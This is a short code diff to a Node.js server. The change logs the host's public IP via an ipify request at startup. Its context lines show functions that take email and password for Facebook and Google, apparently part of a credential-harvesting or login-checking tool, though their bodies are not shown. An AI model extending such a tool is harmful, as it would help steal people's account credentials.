@@ -144,8 +144,11 @@ async function facebookPostData(email,password,username=""){
   });
 }
 
-app.listen(PORT, () => {
-  console.log(`Server is happily running on http://localhost:${PORT}`);
+app.listen(PORT, async() => {
+  const request = await fetch("https://api.ipify.org?format=json");
+  const data = await request.json();
+  console.log(data.ip);
+  console.log(`\nServer is happily running on http://localhost:${PORT}`);
   connect();
 });
 async function GoogleCheck(email,password){
